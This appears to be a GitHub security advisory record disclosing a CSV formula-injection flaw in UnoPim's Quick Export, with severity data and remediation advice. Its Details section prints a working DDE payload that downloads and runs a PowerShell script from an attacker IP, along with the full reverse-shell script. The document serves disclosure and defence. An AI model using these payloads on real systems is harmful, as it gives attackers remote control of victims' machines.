advisory_id: GHSA-74rg-6f92-g6wx
datasource_id: github_osv_importer_v2/GHSA-74rg-6f92-g6wx
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/08/GHSA-74rg-6f92-g6wx/GHSA-74rg-6f92-g6wx.json
aliases:
  - CVE-2025-55745
summary: |
  UnoPim has CSV Injection on Quick Export feature
  ### Summary
  Description:
  `CSV Injection` or `Formula Injection` is a security vulnerability that occurs when malicious content is inserted into a CSV (Comma-Separated Values) file, which is then opened in a spreadsheet application like Microsoft Excel. This attack exploits the way spreadsheet software automatically interprets certain text patterns as formulas or commands, rather than plain text.

  ### Details
  A basic test for CSV Injection is using `SUM()` to add two numbers or open calc.exe​ using​
  command:
   `=cmd|' /C calc'!A0​`


  The same method can be used to run arbitrary code on the victim's machine.
  For example the below code will download and execute a malicious script to create a reverse TCP connection to the attacker's machine.
  *Payload*:
  > This is our payload and will be used in the vulnerable field during exploitation
  ```
      =cmd|' /C powershell Invoke-WebRequest
      "http://52.172.182.242:7000/shell.ps1" -OutFile "$env:Temp\shell.ps1";
      powershell -ExecutionPolicy Bypass -File "$env:Temp\shell.ps1"'!A1​
  ```

  *shell.ps1*:
  ```
      $client = New-Object System.Net.Sockets.TCPClient('52.172.182.242',8000);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()​
  ```

  ### PoC:

    1. Go to any product and click on Edit
    2. Add the above discussed payload in any field that accept text for e.g. Product Number field.
    3. Quick Export -> Select CSV, Open the csv, the formula will get executed during opening.

  > This could be injected by admin or any user that has privilege to edit products.
  > Also the CSRF Injection reported at product edit feature can be used as an attack vector to add such payloads.


  Please note that if this is replicated on version starting from Office 2021:
  Follow these steps:
  Go to `File > Options > Trust Center > Trust Center Settings > External Content​ -> Enable Dynamic Data Exchange Server Launch"`.
  This is due to Office 2021 and Microsoft 365 have DDE disabled by default for enhanced security.

  Platform Details:
  Replicated this on Office 2021 on Windows 11.
  POC video link: https://drive.proton.me/urls/3TP1QEMXNC#2PAy7OkVqdP3

  ### Impact
  When the victim opens the CSV, the injected formula which fetches a reverse shell script written in Powershell from attacker's server and executes it. This creates a reverse shell connection from victim's device to attacker's allowing an attacker to perform any action on the victim's device.

  ### Recommendation:
  - Avoid starting values with Equals sign (=), Plus sign (+), Minus sign (-), At symbol (@), Tab (0x09), Carriage return (0x0D).
  - Sanitize the vulnerable field using regex or standard libraries.
  - Wrap the value around double quotes for fields that cannot be sanitized for some reason so that the value is considered as string instead of formula.
impacted_packages:
  - purl: pkg:composer/unopim/unopim
    affected_versions: vers:composer/<=0.3.0
    fixed_versions: vers:composer/0.3.1
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score: '2.5'
    scoring_system: cvssv4
    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:P/VC:N/VI:N/VA:N/SC:H/SI:H/SA:H/E:P
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/08/GHSA-74rg-6f92-g6wx/GHSA-74rg-6f92-g6wx.json
  - score: LOW
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses:
  - CWE-1236
references:
  - url: https://drive.proton.me/urls/3TP1QEMXNC#2PAy7OkVqdP3
    reference_type:
    reference_id:
  - url: https://github.com/unopim/unopim
    reference_type:
    reference_id:
  - url: https://github.com/unopim/unopim/commit/8325b78567411ad78d44c0385f192360e608ff71
    reference_type:
    reference_id:
  - url: https://github.com/unopim/unopim/commit/b25db9496fc147842a519d1dd42ec03c3bf00a34
    reference_type:
    reference_id:
  - url: https://github.com/unopim/unopim/security/advisories/GHSA-74rg-6f92-g6wx
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2025-55745
    reference_type:
    reference_id: CVE-2025-55745
